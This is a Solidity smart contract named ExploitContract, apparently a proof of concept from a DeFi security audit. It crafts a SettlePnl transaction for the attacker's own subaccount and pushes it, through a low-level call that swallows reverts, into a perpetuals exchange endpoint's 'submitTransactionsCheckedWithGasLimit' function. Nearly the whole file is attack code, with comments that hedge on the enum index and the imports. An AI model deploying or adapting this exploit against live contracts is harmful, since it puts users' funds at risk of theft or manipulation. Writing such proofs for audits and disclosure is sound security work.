// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Adjust these imports based on actual file structure in the repo
import "./interfaces/IEndpoint.sol";
import "./interfaces/engine/IPerpEngine.sol";

contract ExploitContract {
    IEndpoint public endpoint;
    address public attacker;

    event ExploitResult(bool success, bytes returnData);

    constructor(address _endpoint) {
        endpoint = IEndpoint(_endpoint);
        attacker = msg.sender;
    }

    function exploit(uint32 perpProductId) external {
        require(msg.sender == attacker, "Only attacker");

        // 1. Setup the SettlePnl transaction data
        // We craft a SettlePnl struct targeting the attacker's subaccount
        bytes32 subaccount = bytes32(uint256(uint160(attacker)));
        
        bytes32[] memory subaccounts = new bytes32[](1);
        subaccounts[0] = subaccount;

        uint256[] memory products = new uint256[](1);
        products[0] = uint256(perpProductId); 

        // SettlePnl struct definition matching Endpoint.sol decoding
        IEndpoint.SettlePnl memory settleTx = IEndpoint.SettlePnl({
            subaccounts: subaccounts,
            productIds: products
        });

        // 2. Encode Transaction: [Type (1 byte)] + [Encoded Struct]
        // TransactionType.SettlePnl is index 5 in the Enum (Check IEndpoint.sol to confirm)
        bytes memory txData = abi.encodePacked(
            uint8(5), 
            abi.encode(settleTx)
        );

        bytes[] memory transactions = new bytes[](1);
        transactions[0] = txData;

        // 3. EXECUTE THE EXPLOIT
        // Call the vulnerable endpoint function that processes raw transactions
        // We perform a low-level call so that any intentional revert used by the
        // endpoint to surface gas-information does not bubble up and fail the test.
        // This allows the test to verify the transaction was accepted for
        // processing up to the revert point.
        bytes memory payload = abi.encodeWithSelector(
            bytes4(keccak256("submitTransactionsCheckedWithGasLimit(uint64,bytes[],uint256)")),
            uint64(0),
            transactions,
            uint256(10000000)
        );

        // low-level call: do not revert on failure
        (bool success, bytes memory returnData) = address(endpoint).call(payload);
        
        emit ExploitResult(success, returnData);
    }
}
